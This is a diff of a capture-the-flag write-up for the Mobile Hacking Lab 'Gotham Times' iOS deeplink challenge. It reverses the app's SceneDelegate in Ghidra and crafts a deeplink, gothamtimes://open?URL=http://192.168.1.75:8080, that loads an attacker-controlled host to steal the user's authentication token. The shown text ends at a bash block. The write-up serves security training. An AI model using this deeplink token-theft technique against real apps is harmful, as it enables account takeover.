@@ -1,18 +1,48 @@
+---
+title: Mobile Hacking Lab - Gotham Times
+description: "Welcome to the iOS Application Security Lab: Deeplink Exploitation Challenge. The challenge is built around the fictional newspaper Gotham Times, an iOS application providing users with the latest news and updates about events happening in Gotham City. This challenge focuses on the potential vulnerabilities in the deep link feature, emphasizing how attackers can exploit it to gain unauthorized access to sensitive information, particularly authentication tokens. As an attacker, your goal is to craft an exploit that can be used to steal user's authentication token."
+tags:
+  - deep-links
+  - strings
+  - burpsuite
+  - proxy
+  - rev-binaries
+  - uiopen
+  - MobileHackingLab
+  - ios
+keywords:
+  - ios hacking
+  - ctf writeup
+  - MHL
+  - MobileHackingLab
+  - Mobile Hacking Lab
+  - mobile writeups
+  - ios reversing
+  - ios exploitation
+  - mobile security research
+canonical: https://lautarovculic.github.io/writeups/Mobile%20Hacking%20Lab%20-%20Gotham%20Times/
+---
+
 **Description**: Welcome to the **iOS Application Security Lab: Deeplink Exploitation Challenge**. The challenge is built around the fictional newspaper Gotham Times, an iOS application providing users with the latest news and updates about events happening in Gotham City. This challenge focuses on the potential vulnerabilities in the deep link feature, emphasizing how attackers can exploit it to gain unauthorized access to sensitive information, particularly authentication tokens. As an attacker, your goal is to craft an exploit that can be used to steal user's authentication token.
 
 **Download**: https://lautarovculic.com/my_files/gothamTimes.ipa
+
 **Link:** https://www.mobilehackinglab.com/path-player?courseid=lab-gotham-times
 
 ![[gothamTimes1.png]]
 
 Install an **IPA** file can be difficult.
+
 So, for make it more easy, I made a YouTube video with the process using **Sideloadly**.
+
 **LINK**: https://www.youtube.com/watch?v=YPpo9owRKGE
 
 **NOTE**: If you have problems with the keyboard and UI (buttons) when you need to hide it on a physical device, you can fix this problem by using the `KeyboardTools` by `@CrazyMind90` found in the Sileo app store.
 
 Once you have the app installed, let's proceed with the challenge.
+
 **unzip** the **`.ipa`** file.
+
 Let's examine the **`Info.plist`** file.
 ```bash
 cd Payload/Gotham\ Times.app && plutil -convert xml1 Info.plist && cat Info.plist
@@ -112,8 +142,11 @@ _$s12Gotham_Times13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIO
 Now that we know better the *functions names* we can use **Ghidra** for an deep understanding of the application behavior.
 
 Our interested class is
+
 `_TtC12Gotham_Times13SceneDelegate`
+
 Where we have the function
+
 `void _TtC12Gotham_Times13SceneDelegate::scene:openURLContexts:`
 ```C
 void _TtC12Gotham_Times13SceneDelegate::scene:openURLContexts:(ID param_1, SEL param_2, ID param_3, ID param_4)
@@ -210,19 +243,23 @@ if ((local_2d4 & 1) != 0) {
 ```
 
 Where
+
 - The URL parameter is obtained from `UIOpenURLContext:`
 ```C
 _objc_msgSend(local_260, "URL");
 _objc_retainAutoreleasedReturnValue();
 ```
+
 - Then, the URL is transformed with:
 ```C
 Foundation::URL::$_unconditionallyBridgeFromObjectiveC(UVar11);
 ```
+
 - Finally, the complete chain is obtained with:
 ```C
 SVar26 = Foundation::URL::get_absoluteString(UVar13);
 ```
+
 - You are getting the host of the URL with:
 ```C
 Foundation::URL::$get_host(UVar13);
@@ -233,6 +270,7 @@ So, the **deeplink** looks like `gothamtimes://open?URL=`
 This could lead to an **Open Redirect** or **Arbitrary URL load into Application** where we can **theft data (i.e. token)**.
 
 We just need create an account, login, and then, open a browser or generate a QR code with the app running, then, go to any URL like
+
 `gothamtimes://open?URL=http://192.168.1.75:8080`
 
 ```bash
